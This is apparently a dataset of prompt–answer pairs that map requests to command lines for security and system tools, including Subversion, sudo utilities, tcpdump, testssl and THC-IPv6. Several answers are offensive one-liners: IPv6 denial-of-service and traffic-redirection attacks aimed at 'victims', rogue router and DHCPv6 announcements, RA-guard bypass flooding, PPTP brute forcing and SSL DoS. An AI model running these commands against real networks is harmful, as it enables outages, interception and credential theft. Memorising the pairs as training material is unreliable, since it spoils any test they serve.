{"input": "Scan the server at `example.com` for the Heartbleed vulnerability and verify its certificate validity using a custom CA file", "answer": "sslyze --heartbleed --certinfo --certinfo_ca_file custom_ca.pem example.com"}
{"input": "Test the server at `example.com` for supported elliptic curves and check if it is vulnerable to the ROBOT attack", "answer": "sslyze --elliptic_curves --robot example.com"}
{"input": "Scan the server at `example.com` for TLS 1.2 support and check if it has the Extended Master Secret (EMS) extension enabled", "answer": "sslyze --tlsv1_2 --ems example.com"}
{"input": "Crack the file \"hidden.wav\" using a custom wordlist named \"passwords.txt\" and save the output to \"result.out\"", "answer": "stegcracker hidden.wav passwords.txt -o result.out"}
{"input": "Crack the file \"data.jpg\" using the wordlist \"custom_list.txt\" and save the output to \"extracted_data.out\"", "answer": "stegcracker data.jpg custom_list.txt -o extracted_data.out"}
{"input": "Run stegcracker on \"file.wav\" with 24 threads, a chunk size of 256, and verbose mode enabled", "answer": "stegcracker file.wav -t 24 -c 256 -V"}
{"input": "Crack the file \"secret_audio.wav\" using the wordlist \"passlist.txt\" in quiet mode", "answer": "stegcracker secret_audio.wav passlist.txt -q"}
{"input": "Embed the file \"message.txt\" into the cover image \"landscape.jpg\" with the highest compression level and suppress all information messages", "answer": "steghide embed -cf landscape.jpg -ef message.txt -z 9 -q"}
{"input": "Embed the file \"confidential.doc\" into the cover image \"background.jpg\" using the passphrase \"topsecret\" and do not embed a checksum for the embedded data", "answer": "steghide embed -cf background.jpg -ef confidential.doc -p topsecret -K"}
{"input": "Extract a hidden message from the file \"output.txt\" using stegsnow with the password \"mypassword\"", "answer": "stegsnow -p mypassword output.txt"}
{"input": "Extract a hidden message from the file \"output.txt\" using stegsnow with the password \"secure123\" and a line length of 80 characters", "answer": "stegsnow -p secure123 -l 80 output.txt"}
{"input": "Extract a hidden message from the file \"output.txt\" using stegsnow with the password \"agent007\" and ensure the message is decompressed", "answer": "stegsnow -p agent007 -C output.txt"}
{"input": "Extract a hidden message from the file \"output.txt\" using stegsnow with the password \"safetyfirst\" and operate in quiet mode", "answer": "stegsnow -p safetyfirst -Q output.txt"}
{"input": "Extract a hidden message from the file \"output.txt\" using stegsnow with the password \"transmit123\" and a line length of 60 characters", "answer": "stegsnow -p transmit123 -l 60 output.txt"}
{"input": "Extract a hidden message from the file \"output.txt\" using stegsnow with the password \"data123\" and enable strict mode", "answer": "stegsnow -p data123 -S output.txt"}
{"input": "How can I stop the stunnel4 service on a Windows system?", "answer": "net stop stunnel4"}
{"input": "Enumerate all possible subdomains for the domain \"example.com\" using all available sources", "answer": "subfinder -d example.com -all"}
{"input": "Find subdomains for multiple domains listed in a file named \"domains.txt\" using all sources and save the output in JSON format", "answer": "subfinder -dL domains.txt -all -oJ"}
{"input": "Use all sources to find subdomains for \"example.com\" and include the source of each subdomain in the JSON output", "answer": "subfinder -d example.com -all -oJ"}
{"input": "Perform a subdomain takeover scan on \"example.com\" using a custom wordlist, force HTTPS connections, and increase the number of threads to 30", "answer": "subjack -d example.com -w custom_wordlist.txt -ssl -t 30"}
{"input": "Scan \"example.com\" for subdomain takeovers, sending requests to every URL in the wordlist, and output the results to \"all_results.txt\"", "answer": "subjack -d example.com -w wordlist.txt -a -o all_results.txt"}
{"input": "Perform a subdomain takeover scan on \"example.com\" with verbose output, using a custom wordlist, and save the results to \"verbose_scan.txt\"", "answer": "subjack -d example.com -w custom_wordlist.txt -v -o verbose_scan.txt"}
{"input": "Enumerate subdomains of \"example.com\" using sublist3r, specify Google and Bing as search engines, and disable colored output", "answer": "sublist3r -d example.com -e google,bing -n"}
{"input": "Revert all changes made to the file `modifiedfile.txt` in the working copy to its state in the repository", "answer": "svn revert modifiedfile.txt"}
{"input": "Create a new directory named `newdir` in the Subversion repository at `https://example.com/svn/repo`", "answer": "svn mkdir https://example.com/svn/repo/newdir -m \"Creating new directory\""}
{"input": "Display the differences between the working copy of `modifiedfile.txt` and its state in the repository", "answer": "svn diff modifiedfile.txt"}
{"input": "List all transactions in the Subversion repository located at \"/var/svn/my_repo\"", "answer": "svnadmin lstxns /var/svn/my_repo"}
{"input": "Display information about the Subversion repository located at \"/var/svn/my_repo\"", "answer": "svnlook info /var/svn/my_repo"}
{"input": "Validate the Subversion authorization file located at `/etc/svn/authz` to ensure it is correctly formatted and free of errors", "answer": "svnauthz-validate /etc/svn/authz"}
{"input": "Include only the files and directories under the path `/project/docs` and drop empty revisions in the Subversion dump file `repo.dump`", "answer": "svndumpfilter include --drop-empty-revs /project/docs < repo.dump > filtered_repo.dump"}
{"input": "Generate a unified diff of changes made in revision 10 of the Subversion repository at `/var/svn/repos`", "answer": "svnlook diff /var/svn/repos --revision 10"}
{"input": "List all directories that were modified in transaction `txn-abc123` of the Subversion repository at `/var/svn/repos`", "answer": "svnlook dirs-changed /var/svn/repos --transaction txn-abc123"}
{"input": "Display the commit message for the latest revision in the Subversion repository at `/var/svn/repos`", "answer": "svnlook log /var/svn/repos"}
{"input": "Create a new directory in the Subversion repository at the URL `https://svn.example.com/repos/project/newdir` with a commit message \"Creating new directory for project.\"", "answer": "svnmucc mkdir https://svn.example.com/repos/project/newdir -m \"Creating new directory for project.\""}
{"input": "Move the file from `https://svn.example.com/repos/project/oldfile` to `https://svn.example.com/repos/project/newfile` with a commit message \"Moving file to new location.\"", "answer": "svnmucc mv https://svn.example.com/repos/project/oldfile https://svn.example.com/repos/project/newfile -m \"Moving file to new location.\""}
{"input": "Delete the file at `https://svn.example.com/repos/project/unneededfile` with a commit message \"Removing unneeded file.\"", "answer": "svnmucc rm https://svn.example.com/repos/project/unneededfile -m \"Removing unneeded file.\""}
{"input": "Add or modify the file `https://svn.example.com/repos/project/newfile` with the contents of the local file `localfile.txt` and include a commit message \"Updating file with new content.\"", "answer": "svnmucc put localfile.txt https://svn.example.com/repos/project/newfile -m \"Updating file with new content.\""}
{"input": "Set the property `svn:ignore` on the directory `https://svn.example.com/repos/project/dir` to the value `*.tmp` with a commit message \"Setting ignore property.\"", "answer": "svnmucc propset svn:ignore \"*.tmp\" https://svn.example.com/repos/project/dir -m \"Setting ignore property.\""}
{"input": "Delete the property `svn:keywords` from the file `https://svn.example.com/repos/project/file.txt` with a commit message \"Removing keywords property.\"", "answer": "svnmucc propdel svn:keywords https://svn.example.com/repos/project/file.txt -m \"Removing keywords property.\""}
{"input": "Run svnserve in listen-once mode for debugging purposes, listen on IP address `192.168.1.100`, and write the process ID to `/var/run/svnserve.pid`", "answer": "svnserve -X --listen-host 192.168.1.100 --pid-file /var/run/svnserve.pid"}
{"input": "Start svnserve in daemon mode, prefer IPv6 for resolving the listen hostname, and serve the repository located at `/svn/repos`", "answer": "svnserve -d -r /svn/repos -6"}
{"input": "Initialize synchronization between the source repository at `http://example.com/svn/repo` and the destination repository at `http://backup.example.com/svn/repo`", "answer": "svnsync initialize http://backup.example.com/svn/repo http://example.com/svn/repo"}
{"input": "Copy revision properties from the source repository at `http://example.com/svn/repo` to the destination repository at `http://backup.example.com/svn/repo`", "answer": "svnsync copy-revprops http://backup.example.com/svn/repo http://example.com/svn/repo"}
{"input": "Copy revision properties from the source repository at `http://192.168.1.100/svn/repo` to the destination repository at `http://192.168.1.200/svn/repo`", "answer": "svnsync copy-revprops http://192.168.1.100/svn/repo http://192.168.1.200/svn/repo"}
{"input": "Generate a compact version identifier for the current working directory, including all details about the working copy's status", "answer": "svnversion ."}
{"input": "Check the version identifier for the working copy in the current directory, but suppress any progress messages to stderr", "answer": "svnversion -q ."}
{"input": "Determine if the directory `/tmp/svn_checkout` is versioned and generate a version identifier if it is", "answer": "svnversion /tmp/svn_checkout"}
{"input": "Generate a version identifier for the working copy at `/usr/local/svn/project` and ensure the output is concise, without any additional status details", "answer": "svnversion -n /usr/local/svn/project"}
{"input": "Check the version identifier for the working copy in the current directory, but only show errors if any occur", "answer": "svnversion -q ."}
{"input": "Generate object size statistics for the repository located at `/var/svn/repos` using fsfs-stats, and use an in-memory cache size of 32 MB to optimize performance", "answer": "fsfs-stats -M 32 /var/svn/repos"}
{"input": "Use fsfs-stats to calculate object size statistics for the repository at `/opt/svn/repos/large_project`, and increase the in-memory cache size to 64 MB for better performance", "answer": "fsfs-stats -M 64 /opt/svn/repos/large_project"}
{"input": "Generate statistics for the repository at `/data/svn/production_repo` using fsfs-stats, and configure the in-memory cache size to 128 MB for handling a large number of objects", "answer": "fsfs-stats -M 128 /data/svn/production_repo"}
{"input": "Create a hot backup of the Subversion repository located at `/var/svn/repos` and store it in `/backup/svn` while keeping only the last 5 backups", "answer": "svn-hot-backup --num-backups=5 /var/svn/repos /backup/svn"}
{"input": "Perform a hot backup of the repository at `/opt/svn/project` and save it to `/mnt/backup/svn`, then verify the integrity of the backup", "answer": "svnadmin hotcopy /opt/svn/project /mnt/backup/svn && svnadmin verify /mnt/backup/svn"}
{"input": "Normalize the mergeinfo for all files and directories in the `/opt/svn/project` directory recursively, but only for the `trunk` branch using svn-mergeinfo-normalizer", "answer": "svn-mergeinfo-normalizer normalize --recursive --branch=trunk /opt/svn/project"}
{"input": "Use svnwrap to execute the `svnadmin load` command to load a repository dump from `/backup/myrepo.dump` into a new repository located at `/svn/repos/newrepo`", "answer": "svnwrap svnadmin load /svn/repos/newrepo < /backup/myrepo.dump"}
{"input": "Convert a sudoers file to LDIF format while expanding aliases and save the result to `output.ldif`", "answer": "cvtsudoers -e -f LDIF -o output.ldif /etc/sudoers"}
{"input": "Convert a sudoers file to LDIF format, starting the `sudoOrder` values at 1000 and incrementing by 10 for each subsequent entry", "answer": "cvtsudoers -f LDIF -O 1000 -I 10 /etc/sudoers"}
{"input": "Convert a sudoers file to LDIF format, match entries using the local passwd and group databases, and save the output to `local_match.ldif`", "answer": "cvtsudoers -f LDIF -M -o local_match.ldif /etc/sudoers"}
{"input": "Convert a sudoers file to JSON format, set the base DN for LDAP queries to `dc=example,dc=com`, and save the output to `ldap_sudoers.json`", "answer": "cvtsudoers -f JSON -b dc=example,dc=com -o ldap_sudoers.json /etc/sudoers"}
{"input": "Convert a sudoers file to JSON format, prune non-matching users, groups, and hosts, and save the output to `pruned_sudoers.json`", "answer": "cvtsudoers -f JSON -p -o pruned_sudoers.json /etc/sudoers"}
{"input": "Edit the file `/etc/fstab` as the user `root` using `sudoedit`, and read the password from standard input", "answer": "sudoedit -u root -S /etc/fstab"}
{"input": "List all available sudo session IDs in the directory `/var/log/sudo-io`", "answer": "sudoreplay -d /var/log/sudo-io -l"}
{"input": "Edit the sudoers file quietly, suppressing verbose syntax error messages", "answer": "visudo -q"}
{"input": "Edit a custom sudoers file located at `/etc/alternate_sudoers` with strict syntax checking enabled", "answer": "visudo -s -f /etc/alternate_sudoers"}
{"input": "Check the syntax of the default sudoers file without making any changes and suppress verbose error messages", "answer": "visudo -c -q"}
{"input": "Open the sudoers file for editing, ensuring no included files are modified, and enable strict syntax checking", "answer": "visudo -I -s"}
{"input": "Convert a sudoers file located at `/etc/sudoers` to JSON format and save the output to `sudoers.json`", "answer": "cvtsudoers -f JSON -o sudoers.json /etc/sudoers"}
{"input": "Replay all sudo session logs stored in `/var/log/sudo-io` with a maximum wait time of 5 seconds between events and at triple speed", "answer": "sudoreplay -d /var/log/sudo-io -m 5 -s 3"}
{"input": "Scan the OCI archive `image.tar` and output the SBOM in SPDX JSON format", "answer": "syft scan oci-archive:image.tar -o spdx-json"}
{"input": "Scan the Docker archive `image.tar` and output the SBOM in CycloneDX JSON format to a file named `output.json`", "answer": "syft scan docker-archive:image.tar -o cyclonedx-json=output.json"}
{"input": "Generate an SBOM for the directory `/var/www/html` and set the base path for scanning to `/var/www`", "answer": "syft scan dir:/var/www/html --base-path /var/www"}
{"input": "Scan the Docker image `python:3.9` and include all layers in the SBOM instead of just the squashed layers", "answer": "syft scan python:3.9 --scope all-layers"}
{"input": "Send a UDP packet to 10.0.0.5 with a source port of 53, a destination port of 53, and a TTL of 128", "answer": "t50 10.0.0.5 --protocol UDP --sport 53 --dport 53 --ttl 128"}
{"input": "Send a TCP packet with a window size of 8192, a maximum segment size (MSS) of 1460, and a window scale of 8 to 192.168.1.200", "answer": "t50 192.168.1.200 -W 8192 --mss 1460 --wscale 8"}
{"input": "Send a DCCP packet to 192.168.1.50 with a source port of 5000, a destination port of 5001, and a DCCP type of 2", "answer": "t50 192.168.1.50 --protocol DCCP --sport 5000 --dport 5001 --dccp-type 2"}
{"input": "Capture all network traffic on the interface `eth0` and display it in a human-readable format", "answer": "tcpdump -i eth0 -A"}
{"input": "Capture all traffic on the interface `eth0` and filter only packets to the IP address 192.168.1.2", "answer": "tcpdump -i eth0 dst 192.168.1.2"}
{"input": "Capture all traffic on the interface `eth0` and filter only packets with the destination IP address 192.168.1.3 and destination port 443", "answer": "tcpdump -i eth0 dst 192.168.1.3 and dst port 443"}
{"input": "Capture all traffic on the interface `eth0` and filter only packets with the source IP address 192.168.1.4 and source port 53", "answer": "tcpdump -i eth0 src 192.168.1.4 and src port 53"}
{"input": "Capture all traffic on the interface `eth0` and filter only packets with the source IP address 192.168.1.9 and destination port 8080", "answer": "tcpdump -i eth0 src 192.168.1.9 and dst port 8080"}
{"input": "Capture all traffic on the interface `eth0` and filter only packets with the destination IP address 192.168.1.10 and source port 9999", "answer": "tcpdump -i eth0 dst 192.168.1.10 and src port 9999"}
{"input": "Capture all traffic on the interface `eth0` and filter only packets with the source IP address 192.168.1.13 and destination port 22, and save the output to a file named `ssh_capture.pcap`", "answer": "tcpdump -i eth0 src 192.168.1.13 and dst port 22 -w ssh_capture.pcap"}
{"input": "Capture all traffic on the interface `eth0` and filter only packets with the destination IP address 192.168.1.14 and source port 53, and save the output to a file named `dns_capture.pcap`", "answer": "tcpdump -i eth0 dst 192.168.1.14 and src port 53 -w dns_capture.pcap"}
{"input": "Capture all traffic on the interface `eth0` and filter only packets with the source IP address 192.168.1.15 and destination IP address 192.168.1.16, and display the packet data in hexadecimal and ASCII format", "answer": "tcpdump -i eth0 src 192.168.1.15 and dst 192.168.1.16 -XX"}
{"input": "Capture all TCP traffic on the network interface `eth0`, perform all post-processing, and save the output to a directory called `output_dir`", "answer": "tcpflow -a -i eth0 -o output_dir"}
{"input": "Capture all TCP traffic on the network interface `eth0`, perform all post-processing, and limit the maximum number of bytes saved per flow to 5000", "answer": "tcpflow -a -i eth0 -b 5000"}
{"input": "Analyze the pcap file \"suspicious.pcap\" with debugging level 2 to get moderate details about its structure", "answer": "tshark -r suspicious.pcap -V"}
{"input": "Create a cache file from a pcap file named `input.pcap` using auto-split mode and save the output to `output.cache`", "answer": "tcpprep --auto=client --pcap=input.pcap --cachefile=output.cache"}
{"input": "Preprocess `data.pcap` using regex-split mode with the regex pattern `HTTP` and output the cache file as `regex_cache.cache`", "answer": "tcpprep --regex=HTTP --pcap=data.pcap --cachefile=regex_cache.cache"}
{"input": "Create a cache file from `test.pcap` using auto-split mode with a minimum network mask length of 24 and save it to `minmask_cache.cache`", "answer": "tcpprep --auto=client --minmask=24 --pcap=test.pcap --cachefile=minmask_cache.cache"}
{"input": "Generate a cache file from `sample.pcap` using auto-split mode with a maximum network mask length of 30 and save it to `maxmask_cache.cache`", "answer": "tcpprep --auto=client --maxmask=30 --pcap=sample.pcap --cachefile=maxmask_cache.cache"}
{"input": "Generate a cache file from `data.pcap` using auto-split mode, reverse the client/server classification, and save it to `reverse_cache.cache`", "answer": "tcpprep --auto=client --reverse --pcap=data.pcap --cachefile=reverse_cache.cache"}
{"input": "Replay a pcap file named `example.pcap` on the interface `eth0` with a delay of 500 milliseconds between loops, looping 3 times", "answer": "tcpreplay -i eth0 -l 3 --loopdelay-ms 500 example.pcap"}
{"input": "Replay a pcap file named `capture.pcap` on the interface `eth0` with a multiplier of 2x the original speed", "answer": "tcpreplay -i eth0 -x 2 capture.pcap"}
{"input": "Replay a pcap file named `example.pcap` on the interface `eth0` with unique IP addresses for each loop iteration, looping 5 times", "answer": "tcpreplay -i eth0 -l 5 --unique-ip example.pcap"}
{"input": "Replay a pcap file named `network.pcap` on interface `eth1` while modifying the IPv4 TTL to 64 and the IPv6 Traffic Class byte to 128", "answer": "tcpreplay-edit -i eth1 --ttl=64 --tclass=128 network.pcap"}
{"input": "Replay a pcap file named `capture.pcap` while adding an 802.1q VLAN tag with a value of 100, a CFI value of 0, and a priority of 3", "answer": "tcpreplay-edit --enet-vlan=add --enet-vlan-tag=100 --enet-vlan-cfi=0 --enet-vlan-pri=3 capture.pcap"}
{"input": "Rewrite the source and destination IP addresses in a pcap file using pseudo-NAT, mapping 192.168.1.10 to 10.0.0.1 and 192.168.1.20 to 10.0.0.2", "answer": "tcprewrite --pnat=\"192.168.1.10:10.0.0.1,192.168.1.20:10.0.0.2\" --infile=input.pcap --outfile=output.pcap"}
{"input": "Rewrite the TCP/UDP ports in a pcap file, mapping port 80 to 8080 and port 443 to 8443", "answer": "tcprewrite --portmap=80:8080 --portmap=443:8443 --infile=input.pcap --outfile=output.pcap"}
{"input": "Randomize MAC addresses in a pcap file using a seed value of 54321, keeping the first 3 bytes unchanged", "answer": "tcprewrite --enet-mac-seed=54321 --enet-mac-seed-keep-bytes=3 --infile=input.pcap --outfile=output.pcap"}
{"input": "Add an 802.1q VLAN tag with a value of 100, priority of 5, and CFI of 0 to all packets in a pcap file", "answer": "tcprewrite --enet-vlan=add --enet-vlan-tag=100 --enet-vlan-pri=5 --enet-vlan-cfi=0 --infile=input.pcap --outfile=output.pcap"}
{"input": "Rewrite the source IP addresses in a pcap file using pseudo-NAT, mapping 192.168.1.0/24 to 10.0.0.0/24", "answer": "tcprewrite --srcipmap=\"192.168.1.0/24:10.0.0.0/24\" --infile=input.pcap --outfile=output.pcap"}
{"input": "Scan the target IP 172.16.254.1 using all modules and save the results to a file named \"scan_results.txt\"", "answer": "nmap -A 172.16.254.1 -oN scan_results.txt"}
{"input": "Run a full scan on the target IP 192.168.1.50 with all modules and specify the interface \"eth1\" for the scan", "answer": "nmap -A 192.168.1.50 -e eth1"}
{"input": "Install or upgrade remote Terraform modules required for the current configuration", "answer": "terraform get"}
{"input": "Perform a deep recovery of all file types from a disk image file named disk_image.dd and store the recovered files in /recovery_output, with debug information enabled", "answer": "photorec /debug /d /recovery_output disk_image.dd"}
{"input": "Scan the domain \"secure.example.com\" and output the results in JSON format to a file named \"secure_scan.json\"", "answer": "testssl --jsonfile secure_scan.json secure.example.com"}
{"input": "Perform a scan on \"example.com\" using a custom OpenSSL binary located at \"/usr/local/bin/openssl\"", "answer": "testssl --openssl /usr/local/bin/openssl example.com"}
{"input": "Perform a scan on \"example.com\" and include hints for the findings in the output", "answer": "testssl --hints example.com"}
{"input": "Scan the domain \"example.com\" and output the results in HTML format to a file named \"example_scan.html\"", "answer": "testssl --htmlfile example_scan.html example.com"}
{"input": "Test the server at \"example.com\" for all vulnerabilities and output the results in a wide format with RFC cipher suite names", "answer": "testssl -U --wide --mapping rfc example.com"}
{"input": "Perform a scan on \"example.com\" and use a custom CA file located at \"/path/to/ca.pem\"", "answer": "testssl --add-ca /path/to/ca.pem example.com"}
{"input": "Test the server at \"example.com\" for all vulnerabilities and output the results in a wide format with no color coding", "answer": "testssl -U --wide --color 0 example.com"}
{"input": "Test the server at \"example.com\" for all vulnerabilities and output the results in a wide format with IANA cipher suite names and extra color coding", "answer": "testssl -U --wide --mapping iana --color 3 example.com"}
{"input": "Test the server at \"example.com\" for all vulnerabilities and output the results in a wide format with OpenSSL cipher suite names and basic color coding", "answer": "testssl -U --wide --mapping openssl --color 1 example.com"}
{"input": "Test the server at \"example.com\" for all vulnerabilities and output the results in a wide format with RFC cipher suite names and no color coding", "answer": "testssl -U --wide --mapping rfc --color 0 example.com"}
{"input": "Perform a verbose scan on the IPv6 address `2001:db8::5` using the `eth0` interface, sending TCP ACK packets to ports 80 and 443", "answer": "nmap -6 -v -e eth0 -p 80,443 -sA 2001:db8::5"}
{"input": "Manipulate all incoming TCP connections as a client on the 'eth3' interface using atk6-connsplit6 with both verbose and debug modes enabled for detailed analysis.\"", "answer": "atk6-connsplit6 -v -d client eth3"}
{"input": "Capture covertly received data on the \"wlan0\" interface and save it to a file named \"captured_data.bin\" without decrypting it", "answer": "tcpdump -i wlan0 -w captured_data.bin"}
{"input": "Perform a denial of service attack on the target system with IP address 2001:db8::1 using the first test case (large hop-by-hop header with router-alert and filled with unknown options) on the eth0 interface", "answer": "atk6-denial6 eth0 2001:db8::1 1"}
{"input": "Perform a denial of service attack on the target system with IP address 2001:db8::7 using the seventh test case (large hop-by-hop header filled with unknown options, no router alert) on the eth0 interface", "answer": "atk6-denial6 eth0 2001:db8::7 7"}
{"input": "Test if the system with the IPv6 address `2001:db8::1` on the local LAN connected to the interface `eth1` is sniffing network traffic", "answer": "atk6-detect_sniffer6 eth1 2001:db8::1"}
{"input": "Use atk6-extract_networks6 to analyze the networks on the interface eth1 and save the output to a file", "answer": "atk6-extract_networks6 eth1 > networks_output.txt"}
{"input": "Advertise the IPv6 address `2001:db8::2` on the `eth0` interface to the target address `2001:db8::3`, using the MAC address `00:11:22:33:44:55`, and send 10 packets with a 2-second delay between them", "answer": "atk6-fake_advertise6 -n 10 -w 2 eth0 2001:db8::2 2001:db8::3 00:11:22:33:44:55"}
{"input": "Advertise the IPv6 address `2001:db8::c` on the `eth0` interface, add both a hop-by-hop header and a one-shot fragment header, and send 30 packets with a 2-second delay", "answer": "atk6-fake_advertise6 -H -f -n 30 -w 2 eth0 2001:db8::c"}
{"input": "Launch a fake DHCPv6 server on the interface `wlan0` for the network `2001:db8:abcd::/48` with the DNS server `2001:db8:abcd::1`, the DHCP server IP address `2001:db8:abcd::2`, and the MAC address `00:11:22:33:44:55`", "answer": "atk6-fake_dhcps6 wlan0 2001:db8:abcd::/48 2001:db8:abcd::1 2001:db8:abcd::2 00:11:22:33:44:55"}
{"input": "Redirect all packets for the mobile IPv6 home address 2001:db8::1 to the care-of address 2001:db8::2 using the home agent address 2001:db8::3 on the eth0 interface.\"", "answer": "atk6-fake_mipv6 eth0 2001:db8::1 2001:db8::3 2001:db8::2"}
{"input": "Simulate a mobile IPv6 update to redirect traffic from the home address 2001:db8::4 to the care-of address 2001:db8::5 using the home agent 2001:db8::6 on the wlan0 interface.\"", "answer": "atk6-fake_mipv6 wlan0 2001:db8::4 2001:db8::6 2001:db8::5"}
{"input": "Test the misconfiguration of a mobile IPv6 home agent by redirecting packets from the home address 2001:db8::7 to the care-of address 2001:db8::8 using the home agent 2001:db8::9 on the enp0s3 interface.\"", "answer": "atk6-fake_mipv6 enp0s3 2001:db8::7 2001:db8::9 2001:db8::8"}
{"input": "Exploit a misconfigured mobile IPv6 home agent to redirect traffic from the home address 2001:db8::a to the care-of address 2001:db8::b using the home agent 2001:db8::c on the tun0 interface.\"", "answer": "atk6-fake_mipv6 tun0 2001:db8::a 2001:db8::c 2001:db8::b"}
{"input": "Continuously send multicast listener queries on the eth0 interface every 5 seconds until interrupted", "answer": "atk6-fake_mld26 -l eth0 -i 5 query"}
{"input": "Send a PIMv6 Prune packet from the source address `2001:db8::22` to the destination address `2001:db8::23` on interface `eth9`, targeting the multicast group `ff02::6`, with the neighbor router address `2001:db8::24` and the target address `2001:db8::25`", "answer": "atk6-fake_pim6 -s 2001:db8::22 -d 2001:db8::23 eth9 prune 2001:db8::24 ff02::6 2001:db8::25"}
{"input": "Announce yourself as a router on the network interface `eth0` with a source IP of `fe80::1`, a source MAC of `00:11:22:33:44:55`, and set the router lifetime to 3000 seconds", "answer": "atk6-fake_router26 -s fe80::1 -S 00:11:22:33:44:55 -l 3000 eth0"}
{"input": "Announce yourself as a router on the interface `eth0` for the network `2001:db8::/64` and specify a DNS server `2001:db8::1`", "answer": "atk6-fake_router6 eth0 2001:db8::/64 2001:db8::1"}
{"input": "Announce yourself as a router on the interface `eth9` for the network `2001:db8:9::/64` without specifying a DNS server, link-local router IP, MTU, or MAC address", "answer": "atk6-fake_router6 eth9 2001:db8:9::/64"}
{"input": "Flood the local network with MLD reports targeting the specific IPv6 address `fe80::1` using the interface `wlan0`", "answer": "atk6-flood_mld6 wlan0 fe80::1"}
{"input": "Flood the local network with MLD router advertisements using the interface eth2 and target the IPv6 address `ff02::2`", "answer": "atk6-flood_mldrouter6 eth2 ff02::2"}
{"input": "Flood the local network with MLD router advertisements using the interface eth4 without specifying a target", "answer": "atk6-flood_mldrouter6 eth4"}
{"input": "Flood the local network with ICMPv6 redirect packets on interface eth0, targeting the device with the IPv6 address 2001:db8::1, and redirecting traffic from the old router 2001:db8::2 to the new router 2001:db8::3", "answer": "atk6-flood_redir6 eth0 2001:db8::1 2001:db8::2 2001:db8::3"}
{"input": "Flood the local network with router advertisements on the eth2 interface, bypassing RA guard security using both fragment and destination headers", "answer": "atk6-flood_router6 -FD eth2"}
{"input": "Run a fragmentation test on the interface `wlan0` targeting the IPv6 address `2001:db8::8` with no initial or final pings and use test case number 1", "answer": "atk6-fragmentation6 -i wlan0 2001:db8::8 -t 1 -n"}
{"input": "Send a kill packet to announce that the router with the address `2001:db8::2` on the `eth1` interface is going down, and include both fragmentation and destination headers", "answer": "atk6-kill_router6 -FD eth1 2001:db8::2"}
{"input": "Redirect all traffic from the victim with IP `2001:db8::1` to the target IP `2001:db8::2` using the original router `2001:db8::3` and the new router `2001:db8::4` on the `eth0` interface", "answer": "atk6-redir6 eth0 2001:db8::1 2001:db8::2 2001:db8::3 2001:db8::4"}
{"input": "Perform a redirection attack on the victim with IP `2001:db8::5` to the target IP `2001:db8::6` using the original router `2001:db8::7`, the new router `2001:db8::8`, and the MAC address `00:1A:2B:3C:4D:5E` for the new router on the `wlan0` interface", "answer": "atk6-redir6 wlan0 2001:db8::5 2001:db8::6 2001:db8::7 2001:db8::8 00:1A:2B:3C:4D:5E"}
{"input": "Redirect traffic from the victim with IP `2001:db8::9` to the target IP `2001:db8::10` using the original router `2001:db8::11`, the new router `2001:db8::12`, and a hop limit of 128 on the `eth1` interface", "answer": "atk6-redir6 eth1 2001:db8::9 2001:db8::10 2001:db8::11 2001:db8::12 128"}
{"input": "Execute a redirection attack on the victim with IP `2001:db8::13` to the target IP `2001:db8::14` using the original router `2001:db8::15`, the new router `2001:db8::16`, the MAC address `00:1A:2B:3C:4D:5F` for the new router, and a hop limit of 64 on the `eth2` interface", "answer": "atk6-redir6 eth2 2001:db8::13 2001:db8::14 2001:db8::15 2001:db8::16 00:1A:2B:3C:4D:5F 64"}
{"input": "Redirect all traffic from the victim with IP `2001:db8::17` to the target IP `2001:db8::18` using the original router `2001:db8::19` and the new router `2001:db8::20` on the `eth3` interface, but do not specify a MAC address or hop limit", "answer": "atk6-redir6 eth3 2001:db8::17 2001:db8::18 2001:db8::19 2001:db8::20"}
{"input": "Redirect all traffic from the victim IP 2001:db8::13 to the destination IP 2001:db8::14 through the new router 2001:db8::15 with the MAC address 00:1A:2B:3C:4D:5E on the eth0 interface, using the original router 2001:db8::16", "answer": "atk6-redirsniff6 eth0 2001:db8::13 2001:db8::14 2001:db8::16 2001:db8::15 00:1A:2B:3C:4D:5E"}
{"input": "Send a TooBig message to the target IP 2001:db8::3 from the existing IP 2001:db8::4 with an MTU of 1500 bytes on the wlan0 interface, and set the hop limit to 128", "answer": "atk6-toobig6 wlan0 2001:db8::3 2001:db8::4 1500 128"}
{"input": "Trace the path to the IPv6 address `2001:db8::10` using the `eth0` interface, and use ICMP6 TooBig messages instead of Ping requests", "answer": "tracepath6 -i eth0 2001:db8::10"}
{"input": "Attack the PPTP service at 172.16.254.1 using 10 parallel attempts and a custom PPTP port of 2000", "answer": "thc-pptp-bruter -n 10 -p 2000 172.16.254.1"}
{"input": "Perform a brute force attack on the PPTP service at 10.0.0.1 with verbose output, 15 parallel attempts, and a custom PPTP port of 3000", "answer": "thc-pptp-bruter -v -n 15 -p 3000 10.0.0.1"}
{"input": "Run a brute force attack on the PPTP service at 192.168.1.50 with verbose output, 8 parallel attempts, and the wordlist \"top1000.txt.\"", "answer": "thc-pptp-bruter -v -n 8 -w top1000.txt 192.168.1.50"}
{"input": "Test the resilience of the SSL/TLS service at 203.0.113.45 by applying all attack vectors supported by thc-ssl-dos", "answer": "thc-ssl-dos 203.0.113.45"}
{"input": "Stress-test the SSL/TLS service on the host 172.16.254.1 by applying all attack methods in thc-ssl-dos", "answer": "thc-ssl-dos 172.16.254.1"}
{"input": "Start restfulHarvest on IP 192.168.0.10 and port 7000, with info-level logging and automatic reload disabled", "answer": "restfulHarvest -H 192.168.0.10 -p 7000 -l info --no-reload"}
{"input": "Perform a comprehensive search for all available information about the domain \"example.com\" using all data sources supported by theHarvester", "answer": "theHarvester -d example.com -b all"}
{"input": "Gather all possible information about the domain \"example.org\" and save the results to a file named \"output.txt\"", "answer": "theHarvester -d example.org -b all -f output.txt"}
{"input": "Perform an exhaustive search for all information about the domain \"example.edu\" using all sources and display verbose output", "answer": "theHarvester -d example.edu -b all -v"}
{"input": "Search for all available data about the domain \"example.com\" using all sources and include Shodan data in the results", "answer": "theHarvester -d example.com -b all,shodan"}
{"input": "Perform a security check using tigercron, include explanations in the report, and save the report to `/var/log/tiger_explanations`", "answer": "tigercron -e -l /var/log/tiger_explanations"}
{"input": "Set a new password for the TightVNC server and save it to a custom file location", "answer": "vncpasswd /path/to/custom/passwd/file"}
{"input": "Connect to a VNC server running on the host 203.0.113.75 at port 5903 and display the connection on Xvnc display number 5", "answer": "vncviewer 203.0.113.75:5903 -display :5"}
{"input": "Kill the TightVNC server running on display number 1", "answer": "tightvncserver -kill :1"}
{"input": "Start a TightVNC server with a desktop name \"RemoteDesktop\", a color depth of 16 bits, and ensure it is never shared", "answer": "tightvncserver -name RemoteDesktop -depth 16 -nevershared"}
